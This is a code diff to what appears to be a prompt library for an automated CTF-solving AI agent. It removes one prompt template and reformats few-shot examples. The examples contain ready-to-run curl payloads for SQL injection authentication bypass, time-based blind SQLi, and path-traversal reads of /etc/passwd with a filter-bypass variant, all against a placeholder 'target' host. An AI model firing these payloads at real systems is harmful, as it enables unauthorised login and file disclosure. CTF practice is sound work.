@@ -262,35 +262,6 @@ class CTFSolvePrompt:
     - If input is empty or unusable, return {"summary":"", "artifacts":[], "signals":[], "code":[], "env":{}, "constraints":[], "errors":["EMPTY_OR_INVALID_INPUT"]}.
     """
 
-    parsing_Human_translation = """
-    Your role: Explain the INSTRUCTION output step-by-step so a human can run it immediately.
-    Write all explanations and headers in ENGLISH. Commands/scripts must also be in ENGLISH.
-    Do NOT attempt to solve the challenge. Cover only the next single cycle.
-
-    INPUT
-    - STATE (optional): env/constraints/artifacts summary
-    - INSTRUCTION: {"what_to_find":"...","steps":[{"name":"...","cmd":"...","success":"...","artifact":"...","code":"..."}]}
-
-    OUTPUT FORMAT (Markdown only, concise)
-
-    # Objective (What to find)
-    - One-line target: <verbatim from what_to_find>
-
-    # Prechecks
-    - List tools/paths/permissions to verify before running.
-    - If STATE is provided, reflect STATE.constraints/env.
-
-    # Steps
-    Repeat the following for each step.
-
-    ## 1) <steps[i].name>
-    Explanation: 1–2 sentences on why this step matters.
-
-    **Command** (one command per fence, no prose inside):
-    ```bash
-    <steps[i].cmd>
-    """
-    
     feedback_prompt = """
     You are a feedback and state-update assistant for ONE cycle in a CTF workflow.
 
@@ -641,32 +612,32 @@ class few_Shot:
     """
 
     web_SQLI = """{
-  "candidates": [
-    {
-      "vuln": "SQL Injection",
-      "why": "Login form directly concatenates user input into SQL query without parameterization",
-      "cot_now": "First, test boolean-based SQLi with OR 1=1 payload to check for auth bypass. Then verify time-based blind SQLi with SLEEP to confirm injectable parameter. This establishes exploitability before deeper enumeration.",
-      "tasks": [
-        {
-          "name": "boolean_sqli_test",
-          "cmd": "curl -s -X POST -d 'username=admin'\"'\" OR '\"'\"'1'\"'\"'='\"'\"'1&password=x' http://target/login -o sqli_bool.html",
-          "success": "re:welcome|dashboard|logged in|success",
-          "artifact": "sqli_bool.html"
-        },
-        {
-          "name": "time_based_sqli_test",
-          "cmd": "time curl -s -X POST -d 'username=admin'\"'\" AND SLEEP(3)--&password=x' http://target/login -o /dev/null 2>&1 | grep real",
-          "success": "re:0m[3-9]",
-          "artifact": "-"
-        }
-      ],
-      "expected_signals": [
-        {"type": "other", "name": "auth_bypass", "hint": "Response contains success indicators"},
-        {"type": "other", "name": "time_delay", "hint": "Response delayed by 3+ seconds"}
-      ]
-    }
-  ]
-}"""
+    "candidates": [
+      {
+        "vuln": "SQL Injection",
+        "why": "Login form directly concatenates user input into SQL query without parameterization",
+        "cot_now": "First, test boolean-based SQLi with OR 1=1 payload to check for auth bypass. Then verify time-based blind SQLi with SLEEP to confirm injectable parameter. This establishes exploitability before deeper enumeration.",
+        "tasks": [
+          {
+            "name": "boolean_sqli_test",
+            "cmd": "curl -s -X POST -d 'username=admin'\"'\" OR '\"'\"'1'\"'\"'='\"'\"'1&password=x' http://target/login -o sqli_bool.html",
+            "success": "re:welcome|dashboard|logged in|success",
+            "artifact": "sqli_bool.html"
+          },
+          {
+            "name": "time_based_sqli_test",
+            "cmd": "time curl -s -X POST -d 'username=admin'\"'\" AND SLEEP(3)--&password=x' http://target/login -o /dev/null 2>&1 | grep real",
+            "success": "re:0m[3-9]",
+            "artifact": "-"
+          }
+        ],
+        "expected_signals": [
+          {"type": "other", "name": "auth_bypass", "hint": "Response contains success indicators"},
+          {"type": "other", "name": "time_delay", "hint": "Response delayed by 3+ seconds"}
+        ]
+      }
+    ]
+  }"""
 
     web_SSTI = """{
   "candidates": [
@@ -697,32 +668,32 @@ class few_Shot:
 }"""
 
     web_LFI = """{
-  "candidates": [
-    {
-      "vuln": "Local File Inclusion",
-      "why": "File parameter in URL accepts user input; no path validation observed in source",
-      "cot_now": "Attempt to read /etc/passwd using path traversal sequences. Test both encoded and plain traversal patterns. Success confirms arbitrary file read capability for further exploitation.",
-      "tasks": [
-        {
-          "name": "lfi_passwd_test",
-          "cmd": "curl -s 'http://target/view?file=../../../etc/passwd' -o lfi_passwd.txt && grep -c 'root:' lfi_passwd.txt",
-          "success": "re:^[1-9]",
-          "artifact": "lfi_passwd.txt"
-        },
-        {
-          "name": "lfi_encoded_test",
-          "cmd": "curl -s 'http://target/view?file=....//....//....//etc/passwd' -o lfi_encoded.txt",
-          "success": "root:x:0:0",
-          "artifact": "lfi_encoded.txt"
-        }
-      ],
-      "expected_signals": [
-        {"type": "leak", "name": "passwd_leak", "hint": "/etc/passwd contents retrieved"},
-        {"type": "other", "name": "filter_bypass", "hint": "Path traversal filter bypassed"}
-      ]
-    }
-  ]
-}"""
+    "candidates": [
+      {
+        "vuln": "Local File Inclusion",
+        "why": "File parameter in URL accepts user input; no path validation observed in source",
+        "cot_now": "Attempt to read /etc/passwd using path traversal sequences. Test both encoded and plain traversal patterns. Success confirms arbitrary file read capability for further exploitation.",
+        "tasks": [
+          {
+            "name": "lfi_passwd_test",
+            "cmd": "curl -s 'http://target/view?file=../../../etc/passwd' -o lfi_passwd.txt && grep -c 'root:' lfi_passwd.txt",
+            "success": "re:^[1-9]",
+            "artifact": "lfi_passwd.txt"
+          },
+          {
+            "name": "lfi_encoded_test",
+            "cmd": "curl -s 'http://target/view?file=....//....//....//etc/passwd' -o lfi_encoded.txt",
+            "success": "root:x:0:0",
+            "artifact": "lfi_encoded.txt"
+          }
+        ],
+        "expected_signals": [
+          {"type": "leak", "name": "passwd_leak", "hint": "/etc/passwd contents retrieved"},
+          {"type": "other", "name": "filter_bypass", "hint": "Path traversal filter bypassed"}
+        ]
+      }
+    ]
+  }"""
 
     forensics_PCAP = """{
   "candidates": [
